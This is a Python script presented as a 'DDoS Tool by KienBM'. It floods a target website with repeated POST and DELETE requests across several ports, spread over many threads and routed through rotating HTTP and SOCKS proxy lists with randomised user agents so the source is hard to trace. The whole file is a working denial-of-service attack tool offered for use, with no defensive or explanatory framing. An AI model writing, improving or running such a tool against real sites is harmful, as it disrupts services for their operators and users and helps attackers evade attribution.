import requests
import random
import threading
import os
import argparse
import time
from urllib.parse import urlparse
import xml.etree.ElementTree as ET

def generate_payload(useragent, host, port, nocache):
    root = ET.Element("payload")
    useragent_el = ET.SubElement(root, "useragent")
    useragent_el.text = useragent
    host_el = ET.SubElement(root, "host")
    host_el.text = host
    port_el = ET.SubElement(root, "port")
    port_el.text = str(port)
    nocache_el = ET.SubElement(root, "nocache")
    nocache_el.text = str(nocache)

    return ET.tostring(root, encoding='utf8', method='xml').decode()

def send_post_request(url, payload, proxy, useragent, port):
    headers = {'User-Agent': useragent, 'Content-Type': 'application/xml'}
    try:
        if port == 443:
            response = requests.post(url, data=payload, headers=headers, timeout=5, verify=False, proxies={'http': proxy, 'https': proxy})
        else:
            response = requests.post(f"{url.rstrip('/')}:{port}", data=payload, headers=headers, timeout=5, verify=False, proxies={'http': proxy, 'https': proxy})
        print(f"[+] {proxy}:{port} STATUS: {response.status_code}")
    except:
        print(f"[!] {proxy}:{port} Error sending POST request")
def send_delete_request(url, proxy, useragent, port):
    headers = {'User-Agent': useragent}
    try:
        if port == 443:
            response = requests.delete(url, headers=headers, timeout=5, verify=False, proxies={'http': proxy, 'https': proxy})
        else:
            response = requests.delete(f"{url.rstrip('/')}:{port}", headers=headers, timeout=5, verify=False, proxies={'http': proxy, 'https': proxy})
        print(f"[+] {proxy}:{port} STATUS: {response.status_code}")
    except:
        print(f"[!] {proxy}:{port} Error sending DELETE request")

def get_proxies(file_name, proxy_type):
    if os.path.exists(file_name):
        with open(file_name, 'r') as f:
            all_proxies = f.read().splitlines()

        return [proxy.strip() for proxy in all_proxies if urlparse(proxy).scheme == proxy_type]
    else:
        return []

def get_useragents(file_name):
    with open(file_name, 'r') as f:
        all_useragents = f.read().splitlines()
    return all_useragents

def attack_proxies(proxy_list, useragents, url, run_time, host, port, nocache):
    useragent = random.choice(useragents)
    start_time = time.time()
    while time.time() - start_time <= run_time:
        proxy = random.choice(proxy_list)
        payload = generate_payload(useragent, host, port, nocache)
        port_list = [443, 80, 8080, 8000, 53]
        for port in port_list:
            send_post_request(url, payload, proxy, useragent, port)
            send_delete_request(url, proxy, useragent, port)

def main(url, run_time, http_file="http.txt", socks4_file="socks4.txt", socks5_file="socks5.txt", num_threads=10, host=None, port=0, nocache=False):
    threads = []
    
    # read proxy lists
    http_proxies = get_proxies(http_file, 'http')
    socks4_proxies = get_proxies(socks4_file, 'socks4')
    socks5_proxies = get_proxies(socks5_file, 'socks5')
    proxies = http_proxies + socks4_proxies + socks5_proxies
    random.shuffle(proxies)

    useragents = get_useragents('ua.txt')
    proxies_per_thread = len(proxies) // num_threads
    if proxies_per_thread == 0:
        proxies_per_thread = 1
    for i in range(num_threads):
        # divide proxies equally amongs threads
        start = i * proxies_per_thread
        end = (i + 1) * proxies_per_thread
        thread_proxies = proxies[start:end]

        thread = threading.Thread(target=attack_proxies, args=(thread_proxies, useragents, url, run_time, host, port, nocache))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="DDoS Tool by KienBM")
    parser.add_argument('--url', dest='url', required=True, help='URL of the website to attack')
    parser.add_argument('--run_time', dest='run_time', type=int, default=300, help='Running time in seconds')
    parser.add_argument('--http_file', dest='http_file', default='http.txt', help='File containing HTTP proxies')
    parser.add_argument('--socks4_file', dest='socks4_file', default='socks4.txt', help='File containing SOCKS4 proxies')
    parser.add_argument('--socks5_file', dest='socks5_file', default='socks5.txt', help='File containing SOCKS5 proxies')
    parser.add_argument('--num_threads', dest='num_threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--host', dest='host', default=None, help='Hostname to send in payload')
    parser.add_argument('--port', dest='port', type=int, default=80, help='Port to send in payload')
    parser.add_argument('--nocache', dest='nocache', action='store_true', help='Specify if payload should include "nocache" flag')

    args = parser.parse_args()
    main(args.url, args.run_time, args.http_file, args.socks4_file, args.socks5_file, args.num_threads, args.host, args.port, args.nocache)
